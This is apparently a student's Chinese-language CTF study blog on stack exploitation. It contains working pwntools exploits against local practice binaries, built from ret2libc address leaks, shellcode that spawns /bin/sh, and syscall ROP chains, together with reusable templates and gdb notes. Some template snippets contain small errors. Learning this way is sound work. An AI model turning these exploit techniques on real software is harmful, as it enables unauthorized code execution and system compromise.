---
title: "ret2libc、shellcode 与 syscall"
date: 2025-05-15
categories:
  - 二进制安全
  - ROP
tags:
  - pwn
  - ret2libc
  - shellcode
  - syscall
---

## ret2libc3
libc题，直接套模板套模板

反编译以后发现了一个问题。

buf长度超过0x80会自动结束。怎么样让它别检测了呢


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530407923-76549df7-6596-487d-ab4d-70a49c97d75f.png)

后来博览群书后发现这strlen函数它有一个缺点。它读到＼0会终止计数

它有一个加强版本strnlen。它遇到maxlen就会终止。就没法无限输入进去。但是遇到/0它还是会停。

这道题是strlen函数。在payload之前用＼0截断它就行

然后用libc公式

还要注意一个你截断了它的计数，你后面溢出的时候。就不是0x68了，就是0x67。截断的时候也占了一个字节

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
e = ELF("./pwn6")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = process("./pwn6")
gdb.attach(p, 'b main')
p.recvuntil("message:")
ret = 0x400556
rdi = 0x4007d3
puts_plt = e.plt['puts']
puts_got = e.got['puts']
main = 0x4006B0

payload = b'\x00' 
payload += b'A'* (0x67) 
payload += p64(rdi) 
payload += p64(puts_got) 
payload += p64(puts_plt) 
payload += p64(main)

p.sendline(payload)
p.recvuntil("Received\n")
addr = u64(p.recv(6).ljust(8, b'\x00'))
print("puts real addr: " + hex(addr))

libc_base = addr - libc.sym['puts']
system = libc_base + libc.sym['system']
binsh = libc_base+ next(libc.search(b"/bin/sh"))

payload = b'\x00' 
payload += b'a'* (0x67) 
payload += p64(ret) 
payload += p64(rdi) 
payload += p64(binsh) 
payload += p64(system)
p.recvuntil("message:")
p.sendline(payload)
p.interactive()
```

这个接收recvuntil搞了半天。后面要加个\n。行了

把模板稍微精简了一下？（bushi)（地址写短了）

## ret2shellcode1
先checksec 一下，没有canary


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530407976-b2144d57-8fb6-4022-b814-df2c9f2c06a1.png)

然后用直接自动生成的那个命令（下面的），不用再写汇编或者用网站转化了

```plain
payload=asm(shellcraft.sh())
```

然后就直接发送payload.成功了

这里有个问题，第一次没加gdb attach的时候成功了，加了以后反而不行。

就是下面这两个

```plain
debug_word='b main'
gdb attach(p ,debug_word )
```

它先运行的这个gdb.还没有到后面的程序。所以这个时候直接ls是没有结果的。要继续步进或者直接把gdb关了，才会执行后面的。

构造的这个它好像直接构造了一个payload就发过去了，好像没有绕过这个nx保护。这是怎么回事。

```python
from pwn import*
debug_word='b main'
context(arch='amd64', os='linux', log_level='debug')
p=process('./pwn')
gdb.attach(p ,debug_word )
payload=asm(shellcraft.sh())

p.sendline(payload)
p.interactive()
```

## ret2shellcode2
先checksec文件（以后记得每次先给文件开个权限，报错了三次我以为我写错了）


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530407860-7c35076b-fca2-47fa-b0db-48a79dcfaf1b.png)

还是没有canary的shellcode，但是还有nx保护，用ida看一下。里面有mprotect这个函数，就可以直接通过这个函数把.bss段弄成可执行的。


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530407917-b6c53fed-e031-4449-987c-5a819b43fde2.png)

第一次没明白，这个在gdb里buff的地址怎么看。每次算的时候拿rdi减去0x100缓冲区算下来是高地址。只学会了在gdb里看哪一段可读可写可执行（gdb看的写到底下了，也是后来会的）

```plain
pwndebug> vmmap
```

后来直接拿ida看了。先找到bss段，然后在里面找buff.找到之后就有了返回地址


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530407917-71388a04-4f6b-4df8-aa6c-f307d1bfc11a.png)

这是exp

```python
from pwn import*

context(arch='amd64', os='linux', log_level='debug')
debug_word='b main'
p=process('./shellcode')
gdb.attach(p, debug_word)
shellcode=asm(shellcraft.sh())
payload=shellcode.ljust(0x108,b'A')
payload+=p64(0x4040A0)

p.sendline(payload)
p.interactive()
```

其实上面第二题也可以这么写的，加上补充的。直接那样补充方便一点。

```plain
# 假设 shellcode 长度为 40 字节
shellcode = b"\x31\xc0\x48\xbb\x...\x00"  # 你的实际 shellcode
padding = b'A' * (0x108 - len(shellcode))  # 计算需要填充的长度
payload = shellcode + padding + p64(0x4040A0)
```

## ret2shellcode3
第三道

先看checksec 里面有nx保护，但是吧，又跟第一道题一样，它又用了mprotect这个函数。有这个函数即使有nx保护也可以写入shellcode了


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530409146-71c0ec8e-59d7-46d8-b493-fadac97916ed.png)

这道题有一个问题，他这个read里面只让写0x25个（最多），然后咱们上面自动生成的shellcode查阅资料后了解到一般是0x70到0x100个长度。所以这回咱们要手写一个短一点的shellcode

格式基本不变。

```python
from pwn import*

context(arch='amd64', os='linux', log_level='debug')
debug_word='b main'
p=process('./shellcode')
gdb.attach(p, debug_word)
shellcode=asm() #改成具体手写
p.sendline(shellcode)
p.recvuntil("")#准确接收和发送，可写可不写吧
payload=b'A'*(0x00+8)
payload+=p64(0x000000)#填具体需要覆盖的缓冲区长度和返回的bss段地址

p.sendline(payload)
p.interactive()
```

然后再看看具体缓冲区要填多少，返回地址在bss哪一段

按照64位shellcode手写模板写一下

想办法把指令缩短，但是还具有原来功能。把mov改两个，改成push和pop。

试了一下发现可以了。就是这个有限制才不行的。

Exp

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p=process('./ret2shellcode3')

shellcode = asm('''
    mov rbx, 0x0068732f6e69622f
    push rbx
    push rsp
    pop rdi
    xor esi,esi
    xor edx,edx
    push 59
    pop rax
    syscall
''')
p.recvuntil("Please.")
p.sendline(shellcode)

name_addr=0x6010A0
payload=b'A'*18+p64(name_addr)
p.recvuntil("Let's start!")
p.sendline(payload)

p.interactive()
```

还不太清楚每个具体的汇编到底有多少长度。目前只能靠网站看和积累了

新学了两个gdb指令，看长度

```plain
 disassemble /r main #把main的汇编，汇编的长度，地址全都显示出来
rasm2 -a x86 -b 64 "pop rax" #说是算单个指令长度的，算出来58我也不知道是啥
```

## 写shellcode的时候注意的
### 1. 为什么要清空 `esi` 和 `edx` 寄存器？
这与 Linux 系统调用 `execve` 的参数要求有关。

在 64 位 Linux 中，执行系统调用（syscall）时，参数是通过特定的寄存器传递的。对于 `execve` 系统调用（系统调用号 59，即 `0x3b`），其 C 语言原型如下：

```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
```

对应的寄存器分配是：

+ `**rax**`: 系统调用号 (59)
+ `**rdi**`: 第 1 个参数 `pathname` (指向 "/bin/sh" 字符串的地址)
+ `**rsi**`: 第 2 个参数 `argv[]` (指向参数数组的指针)
+ `**rdx**`: 第 3 个参数 `envp[]` (指向环境变量数组的指针)

**为什么要清零？** 当我们只是想简单地拿到一个 shell (getshell) 时，通常不需要传递任何额外的参数（`argv`），也不需要特定的环境变量（`envp`）。因此，我们将这两个参数设置为 **NULL**（即 0）是最方便且不容易出错的做法。

**总结：** 清空它们是为了构造 `execve("/bin/sh", NULL, NULL)`，告诉系统“我要运行 /bin/sh，没有参数，没有环境变量”。

## random
随机数.

种子固定的。本地可以生成相同的。有nx保护，但是这道题有bin/sh.不用写shellcode或者rop链之类的。好像nx也没啥用？


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530408622-51228c31-6a1f-4a79-8bbc-7269ad5b1da5.png)

有现成的后门就直接用了。然后种子固定就能本地生成固定的随机数。可以用本地c语言生成对应随机数

```plain
#include 
#include 
int main( ){
        srand(0x39);
        printf("Random: %d\n", rand());
        return 0;
}
```

运行完是224。直接发送随机数验证的时候sendline(b'224')又不对了

我后来拿gdb调了一下。发现这个生成的随机数确实不是224

```plain
 disassemble /r vuln #计算调用rand时的偏移量
 b *vuln+0x41 #在调用之前下断点
 r
 ni #步进到rand调用的时候
 p $eax #打印此时的随机数
```


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530408698-7e18862a-f14a-46b1-a973-ac5392d34bf2.png)

到这已经能写这个exp了

```python
from pwn import*
context(arch='amd64', os='linux', log_level='debug')
debug_word='vuln'
p=process('./random')
gdb.attach(p,debug_word)
p.recvuntil(b"name:")
p.sendline(b'1956681178')
p.recvuntil(b"next?")
payload=b'A'*(0x40+8)
payload+=p64(0x4008B6)
p.sendline(payload)
p.interactive()
```

但是我看资料，资料上说还有libc,本地c语言生成的还要编译？

我直接看了这两种方法

这个libc泄露还是撞库，只会了固定种子的。这个随机种子的话格式还不会写。

```plain
libc = CDLL("libc.so.6")
libc.srand(0x39)
```

前面加上这两个就行了。对，还要引入一个工具。

```plain
from ctypes import*
```

然后关于c语言编译的问题。

我用的是windows编译的c。而要用linux编译才对

```plain
vim text.c
```

然后写自己本地的c语言，写好以后gcc 编译就可以（这的gcc还不熟。没找见gcc表，就只会了两个看的。但是进去看不太懂）

```plain
gcc text.c -o text &&./text
man gcc  ;看gcc指令的两个
help gcc
```


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530408694-a9ecb4a4-d884-42a9-8577-4fd13af8f51f.png)

## retsyscall1
构造syscall的rop链。有nx保护了。再看ida（感觉每次check完都是这）

不是，为啥会有system和sh?没有bin/sh.试试看这个sh能不能发挥以下bin/sh的作用。这个感觉这下连rop链都不用弄了。


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530408728-9f8cefe5-72d0-4e93-8392-2d54506706e6.png)

把system和sh的找见就行了


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530409527-74ad0a3e-064f-4711-98bc-82ed396a6d78.png)


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530409569-79689a28-d223-4ac6-b96a-791b322c80b1.png)

找这个又花了半天时间。字符串按u就能拆开。对ida还是不太熟悉

可以了

感觉跟刚开始学栈溢出做的题一样。就写个payload就行了

```sql
from pwn import*
context(arch='amd64', os='linux', log_level='debug')
p=process('./ret2syscall1')
gdb.attach(p,'b main')
system=0x8048529  
sh=0x8048670
payload=b'A'*(0x18+4)+p32(system)+p32(sh)
p.sendline(payload)
p.interactive()
```

为什么sh能当bin/sh来用，是规定。sh和bin/sh能发挥一样的作用

## ret2syscall2
我觉得应该要构造rop链了

先拿ida看一下。第一次见这么多函数，完了完了完了，这次有canary了


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530409516-236d4647-23c0-4394-a47c-471af8501fc5.png)

先分析一下ida，用gadrop命令把构造rop链需要的东西找出来

这道题好像是一个游戏。还没找到漏洞.连上之后先玩一下。

他这个买的时候输完数量确定之后就算成交。只有这个数量咱们有操作空间。想一想。直接输入恶意一点的。特殊字符或者不是正数。不按它要求来就行了。它输入这种就一直运行就停不下来了"^^^"


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530409581-a9bafeba-9a97-44b5-b3a7-96bd69978b87.png)

输入负数就行了

这道题没有后门，ROP链要改一下。

bin/sh写到name里

Exp

```python
from pwn import*
context(arch='amd64', os='linux', log_level='debug')
p=process('./ret2syscall2')
gdb.attach(p,'b menu')
pop_rax = 0x458827
pop_rdi = 0x40264f
pop_rsi = 0x40a67e
pop_rdx = 0x4a404b
ret = 0x40101a 
syscall = 0x402404
bin_sh = 0x4E60F0

p.sendline(b'1')
p.sendline(b'3')
p.sendline(b'-999999')
p.sendline(b'4')
p.sendline(b'5')

payload = b'/bin/sh\x00'
payload += b'A' * (0x20) 
payload += p64(pop_rax)  
payload += p64(0x3b)        
payload += p64(pop_rdi)  
payload += p64(bin_sh)   
payload += p64(pop_rsi)  
payload += p64(0)     
payload += p64(pop_rdx)  
payload += p64(0) 
payload += p64(0)
payload += p64(ret)
payload += p64(syscall) 

p.sendline(payload)
p.interactive()
```

## fmt1
## gdb调试在第二道shellcode里应用一下，想到的一些东西
查看对应东西的指令

```plain
(gdb) x/i 0x4011f4          # 查看该地址对应的汇编指令
(gdb) info symbol 0x4011f4  # 查看符号信息
(gdb) bt                    # 查看完整调用栈
```

原来是拿ida直接看的这个bss段里面到底是啥(现在也不会用gdb看里面是什么函数)，这个buff具体在哪，它是不是可读可写可执行的。拿gdb试了一下

```plain
print &buff
```

这个可以直接打印出buff的地址(

```plain
x/16x 0x4040A0 #查看从地址0x4040A0开始的16个字符的数据
 x/s 0x4040A0 #显示这段地址指向的内存内容
 x/4d 0x4040A0 #显示所在地址的4个整数内容
```

**0x7fffffffdcd0** 是典型的栈地址：

+ 位于内存的高地址区域（x86-64架构栈通常从高地址向低地址增长）

Linux默认代码段起始地址是0x400000

这是检查有没有被覆盖

```plain
(gdb) x/gx $rsp + 0x108        # 查看返回地址是否被覆盖为 0x4040A0
(gdb) x/32x $rsp              # 查看整个缓冲区的内存布局
```

我后来又想了想这个栈溢出到底在干啥。周三我终于明白了。其实最简单的栈溢出就是什么也没有，直接溢出就行.然后之后的这些libc，shellcode,syscall,都是因为返回地址缺失，导致溢出之后无法发送返回地址。所以才要构造这些东西来绕过具体的保护。

## libc是在栈不可执行（NX），并且在bss段不可执行的时候。
通过动态链接库libc(里面有system和bin/sh这些符号)通过writes,puts.计算基地址。有了基地址后再算system和bin/sh的地址。用前面了解到的公式

```plain
libc_base = puts_real_address -libc.sym['puts']
system_address = libc_base + libc.sym['system']
binsh_address = libc_base + next(libc.search(b"/bin/sh"))
```

## shellcode是在栈不可执行（NX），并且bss.段可执行，要溢出的函数不在栈上。或者干脆没有shellcode
这个时候通常能直接发送shellcode来构造一个返回地址。问题就在于怎么处理这个shellcode了。是自动生成直接写入，还是需要补齐shellcode,写入到对应的bss段上。最后要找返回地址覆盖。

当有mprotect函数的时候，即使有nx保护，也可以配合read和gets函数把shellcode写到bss段

生成shellcode和补齐，还有直接利用汇编或网站转化汇编成

```plain
shellcode=asm(shellcraft.sh()) #自动生成
payload=shellcode.ljust(0x108,b'A') #补齐
```

手写shellcode时的汇编指令

先熟悉一下基本汇编指令

```plain
mov rax,0x50 #把0x50赋值2给rax寄存器
add rax,0x50 #将0x50加到rax寄存器
push rax 将rax值推入栈中
pop rax 将栈中存储的数据拿出放入rax
xor al, 0x50 对al寄存器进行异或操作，与0x50进行异或（相同为0，不同为1）
xor eax,dword ptr[rdx + 0x30] #先加0x30,取地址中存储的值。再异或
```

然后学了32位和64位shellcode的模板。由于32位和64位传参不同，编写shellcode时就不同。最后返回的就不一样，一个是0x80，一个是syscall。

```plain
；x32
    push 0x68732f2f   
    push 0x6e69622f 
    mov ebx, esp   
    xor ecx, ecx
    xor edx, edx     
    mov al, 0xb
    int 0x80
```

```plain
;x64
    mov rbx, 0x0068723f6e69622f
    push rbx
    mov rdi,rsp
    mov rsi,0
    mov rdx,0
    mov rax, 59      ;syscall号59
    syscall 
    ;这个是基本模板，如果有限制长度需要更改
```

因为第三道题read只让写0x25数据，你要通过read再写入shellcode直接自动生成是不行的。（因为自动生成的生成的长度比较长大约在0x70到0x100个之间）。手写shellcode汇编

Syscall

## retsyscall是call出来这个system?具体理论还不清楚。主要是会了syscall这个rop链
## 32和64位传参规则（Linux）
### 系统调用下传参：
32位触发指令：int 0x80

寄存器：eax 系统调用号（0x0b）

ebx、ecx、 edx、esi、edi 依次传参 

调用bin/sh

```plain
mov eax, 0x0b       ; 调用系统
mov ebx, binsh_addr ; bin/sh
mov ecx, 0          ; 置零
mov edx, 0          
int 0x80
```

64位触发指令：syscall

传递寄存器：rax ,系统调用号（exexecve）

为（0x3b）

六个寄存器传参

rdi rsi rdx r10 r8 r9

一至六个参数

```plain
mov rax, 0x3b       ; 调用系统
mov rdi, binsh_addr ; bin/sh
mov rsi, 0          ; 置零
mov rdx, 0          
syscall
```

### 普通调用传参
32位从右向左压栈，最后清理栈空间

调用（a,b,c）（注意后进先出）

```plain
push c  ; 先压最后出的
push b
push a
call func
add esp, 12 ; 清理空间，3×4=12
```

64位混合传递。先用寄存器，再用栈传参。

前六个依次通过

rdi rsi rdx rcx r8 r9

rsp指针要求16字节栈对齐

```plain
mov rdi, a  
mov rsi, b  
mov rdx, c  
mov rcx, d  
mov r8, e   
mov r9, f   
push g      ; 参数7压栈
call func   ；调用fun函数
```

```plain
 x/10x $rsp
 info registers
```

其它的：32位寄存器使用pop减少链长度

整体压栈或通过指针传递

64位注意栈对齐。用ret强制对齐。先用寄存器，再用栈传递

## syscall的rop链（这是有bin/sh地址的）
32位

```plain
payload = b'A' * offset  
payload += p32(pop_eax_ret)  # ROPgadget pop eax; ret
payload += p32(0xb)           # 调用系统
payload += p32(pop_edx_ecx_ebx_ret)  # gadget: pop edx; pop ecx; pop ebx; ret
payload += p32(0)                   # 置零
payload += p32(0)                 
payload += p32(binsh_addr)          ebx = bin/sh（在程序里找或者自己构造）
payload += p32(int_0x80_addr)  # int 0x80
```

64位

```plain
payload = b'A' * offset  
payload += p64(pop_rax_ret)  
payload += p64(0x3b)         # execve（64位为59，0x3b）
payload += p64(pop_rdi_ret)  
payload += p64(binsh_addr)   # rdi = bin/sh
payload += p64(pop_rsi_ret)  # ROPgadget: pop rsi; ret
payload += p64(0)            #每次对应置零
payload += p64(pop_rdx_ret)  
payload += p64(0)           
payload += p64(syscall_addr)  #最后调用系统
```

没有bin/sh的时候

```plain
payload += p32(read_plt)          # 调用 read 函数
payload += p32(pop_ebx_ret)       # 清理栈帧（返回地址）
payload += p32(0)                 # fd (stdin)
payload += p32(bss_addr)          # 目标地址（.bss 段）
payload += p32(8)                 # 写入长度（/bin/sh\x00）
```

## sqctf复现
[yh3s](https://hnusec-star.feishu.cn/wiki/Q2ztwN7nzihvsRkbuepcgk9onRd)